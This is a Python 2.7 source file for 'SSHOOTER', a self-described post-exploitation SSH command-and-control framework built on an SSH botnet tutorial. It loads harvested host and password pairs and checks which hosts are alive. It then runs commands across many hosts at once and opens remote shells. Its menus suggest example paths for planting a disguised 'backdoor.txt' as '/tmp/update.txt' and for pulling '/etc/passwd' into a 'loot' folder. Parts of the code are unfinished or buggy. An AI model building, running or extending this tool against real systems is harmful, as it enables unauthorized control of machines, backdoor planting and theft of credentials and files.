#!/usr/bin/python2.7
#
# SSHOOTER - SSH C2
# Author: es0
# Version: 0.13
#
# Discription:
#     SSHOOTER is almost a quasi exploitation and post exploitation type framework that
# uses native ssh commands and built in features to execute tasks.  It is capable of testing for
# weak credentials using a brute force attack. it also allows an operator to
# use discovered credentials to execute commands on targets.
#
# To-Do:
#   1) Add ability to pivot using ssh tunnel
#   2) try to use db to handle creds, hosts and targets.
#   3) Add Brute forcer capability - use ssh_bruter.sh (hydra wrapper script) for now.
#
# Inspired by: http://raidersec.blogspot.com/2013/07/building-ssh-botnet-c-using-python-and.html
# - Built off their code and added functionality. :)
#

from fabric.api import *
import time
import os

version="0.13"
BANNER = r"""
 _____ _____ _   _ _____  _____ _____ ___________
/  ___/  ___| | | |  _  ||  _  |_   _|  ___| ___ \
\ `--.\ `--.| |_| | | | || | | | | | | |__ | |_/ /
 `--. \`--. \  _  | | | || | | | | | |  __||    /
/\__/ /\__/ / | | \ \_/ /\ \_/ / | | | |___| |\ \
\____/\____/\_| |_/\___/  \___/  \_/ \____/\_| \_|xx
-------------------------------------------------------=>
Version: {}   Codename: Bitter Phoenix
""".format(version)


PROMPT = "SSHOOTER $ "
env.hosts = []
running_hosts = {}
dead_hosts = {}

windows_hosts = {}
nix_hosts = {}


def fill_hosts():
    for line in open('data/creds/creds.txt','r').readlines():
        host, passw = line.split()
        env.hosts.append(host)
        env.passwords[host] = passw

def list_hosts():
    os.system('clear')
    print "\n{0:5} | {1:30} | {2:15}".format("ID", "Host", "Status")
    print "-" * 80
    for idx, host in enumerate(env.hosts):
        print "{0:5} | {1:30} | {2}".format(idx, host, running_hosts[host])
    print "\n"

# List Windows Hosts
def windows_hosts():
    print "\n[          Windows Hosts         ]"
    print "\n{0:5} | {1:30} | {2:15}".format("ID", "Host", "Status")
    print "-" * 80
    for idx, host in enumerate(env.hosts):
        print "{0:5} | {1:30} | {2}".format(idx, host, windows_hosts[host])
    print "\n"

def nix_hosts():
    print "\n[            *nix Hosts         ]"
    print "\n{0:5} | {1:30} | {2:15}".format("ID", "Host", "Status")
    print "-" * 80
    for idx, host in enumerate(env.hosts):
        print "{0:5} | {1:30} | {2}".format(idx, host, nix_hosts[host])
    print "\n"


def run_command(command):
    try:
        with hide('running', 'stdout', 'stderr'):
            if command.strip()[0:5] == "sudo":
                results = sudo(command)
            else:
                results = run(command, shell=False)
    except:
        results = 'Error'
    return results

# UPLOAD A FILE
def upload_file(src, dest):
    print "Upload File " + src + " to " + dest
    try:
        with hide('running', 'stdout', 'stderr'):
            results = put(src, dest, use_sudo=False, mirror_local_mode=True)
    except:
        results = "Failed to upload file. :( "
    if results:
        return "SUCCESSFUL UPLOAD!"
    return "FAILED: Not Uploaded"

# DOWNLOAD A FILE
def download_file(src, dest):
    print "Downloading " + src + " to " + dest
    try:
        with hide('running', 'stdout', 'stderr'):
            results = get(src, dest)
    except:
        results = "Failed to download file. :( "
    if results:
        results = "SUCCESSFUL DOWNLOAD!  " + str(results)
    return results
# NOT WORKING :( (probably just need a simple ifexists() type check on the host/pw combo.)
# Import hosts from file.
def import_hosts(imp_file):
    for line in open(imp_file,'r').readlines():
        host, passw = line.split()
        env.hosts.append(host)
        env.passwords[host] = passw


# ==================== SSH TUNNEL =========================
#SSH TUNNELING
# fabric.tunnel.TunnelManager(local_host,localport,remote_host,remoteport,transport,finished)
def tunnel_to_remote(rhost,rport):
    print "tunnel.."
    with remote_tunnel(rport, rhost):
        run("ifconfig")

# Get hosts that have active tunnel.
def get_tunnel_hosts():
    selected_hosts = []
    for host in raw_input("Hosts (eg: 0 1): ").split():
        selected_hosts.append(env.hosts[int(host)])
    return selected_hosts

# ===== END SSH TUNNEL


def check_hosts():
    try:
        ''' Checks each host to see if it's running '''
        print "[+] Checking hosts for signs of life...."
        for host, result in execute(run_command, "uptime", hosts=env.hosts).iteritems():
            if result and result != "Error":
                running_hosts[host] = result
                nix_hosts[host] = result
            elif result == "Error":
                print "[+] Hmmm. " + str(host) + " must be a Windows host.. "
                print "[+] checking 4 signs of life."
                win_uptime = "systeminfo | find \"Boot Time\""
                result = execute(run_command, win_uptime, hosts=host)
                if result and result != "Error":
                    running_hosts[host] = result
		    windows_hosts[host] = result
            else:
                dead_hosts[host] = "No Connection"
    except:
        dead_hosts[host] = "Host Error"

def get_hosts():
    selected_hosts = []
    for host in raw_input("Hosts (eg: 0 1): ").split():
        selected_hosts.append(env.hosts[int(host)])
    return selected_hosts


##############################################################
################# MENU #######################################
##############################################################

def ssh_tunnel_menu():
    is_valid = 0
    for num, desc in enumerate(["List Hosts", "Run Command via Tunnel", "Open Tunnel", "Main Menu" "Exit"]):
        print "[" + str(num) + "] " + desc
    while not is_valid:
        try:
            choice = int(raw_input('\n' + PROMPT))
            is_valid = 1
        except ValueError:
            print "invalid option... Try again."
    while (choice != 6):
        list_hosts()
        # run a command
        if choice == 1:
            cmd = raw_input("Command: ")
            # Execute the "run_command" task with the given command on the selected hosts
            for host, result in execute(run_command, cmd, hosts=get_tunnel_hosts()).iteritems():
                print '\n'
                print "[" + host + "]: " + cmd
                print ('-' * 40) + " [ RESULTS ] " + ('-' * 40) + '\n' + result + '\n'
        # If we choose to open a shell
        elif choice == 2:
            host = int(raw_input("Host: "))
            execute(open_shell, host=env.hosts[host])
        # Upload File to host
        elif choice == 3:
	    print "Main Menu.."
            menu()



        for num, desc in enumerate(["List Hosts", "Run Command via Tunnel", "Open Tunnel", "Main Menu" "Exit"]):
            print "[" + str(num) + "] " + desc
        choice = int(raw_input('\n' + PROMPT))


def menu():
    is_valid = 0
    for num, desc in enumerate(["List Hosts", "Run Command", "Open Shell", "Upload File", "Download File", "SSH Tunnel (Under Development.)", "Import Hosts (under Develpment)", "Exit"]):
        print "[" + str(num) + "] " + desc
    while not is_valid:
        try:
            choice = int(raw_input('\n' + PROMPT))
            is_valid = 1
        except ValueError:
            print "invalid option... Try again."
    while (choice != 7):
        list_hosts()
        # run a command
        if choice == 1:
            cmd = raw_input("Command: ")
            # user run_command for command execution.
            for host, result in execute(run_command, cmd, hosts=get_hosts()).iteritems():
                print '\n'
                print "[" + host + "]: " + cmd
                print ('-' * 40) + " [ RESULTS ] " + ('-' * 40) + '\n' + result + '\n'
        # open a shell on host
        elif choice == 2:
            host = int(raw_input("Host: "))
            execute(open_shell, host=env.hosts[host])
        # Upload File to host
        elif choice == 3:
            print "Upload File - [Local File] [Remote Dest]"
            src_pth = raw_input("\nFile to upload(/tool/out/backdoor.txt): ")
            dest_pth = raw_input("\nPath to upload file to(/tmp/update.txt):")
            for host, result in execute(upload_file, src_pth, dest_pth, hosts=get_hosts()).iteritems():
                os.system('clear')
                print '\n'
                print " [ " + host + " ]: " + " src= " + src_pth + " dest= " + dest_pth
                print ('-' * 40) + " [ RESULTS ] " + ('-' * 40) + '\n' + result + '\n'
        # Download file from host
        elif choice == 4:
            print "Download File - [Remote File] [Local Dest]"
            src_pth = raw_input("\nFile to download(/etc/passwd): ")
            dest_pth = raw_input("\nPath to download file to(/loot/passwd.txt):")
            for host, result in execute(download_file, src_pth, dest_pth, hosts=get_hosts()).iteritems():
                os.system('clear')
                print '\n'
                print " [ " + host + " ]: " + " src= " + src_pth + " dest= " + dest_pth
                print ('-' * 40) + " [ RESULTS ] " + ('-' * 40) + '\n' + result + '\n'
        # SSH TUNNEL
        elif choice == 5:
            print "SSH TUNNELING will be implemented soon..."
            # ssh_tunnel_menu()
        # Import hosts with valid creds.
        elif choice == 6:
            print "Importing Hosts will be implemented soon."
            print "For now modify the data/creds/creds.txt file before starting SSHOOTER"
            #print "Import Hosts from file"
            #file_in = raw_input("\nPath to formatted file with hosts: ")
            #import_hosts(file_in)
            #check_hosts()
        for num, desc in enumerate(["List Hosts", "Run Command", "Open Shell", "Upload File", "Download File", "SSH Tunnel (Under Development.)", "Import Hosts (under Develpment)", "Exit"]):
            print "[" + str(num) + "] " + desc
        choice = int(raw_input('\n' + PROMPT))


if __name__ == "__main__":
    fill_hosts()
    check_hosts()
    time.sleep(5)
    os.system('clear')
    print BANNER
    menu()
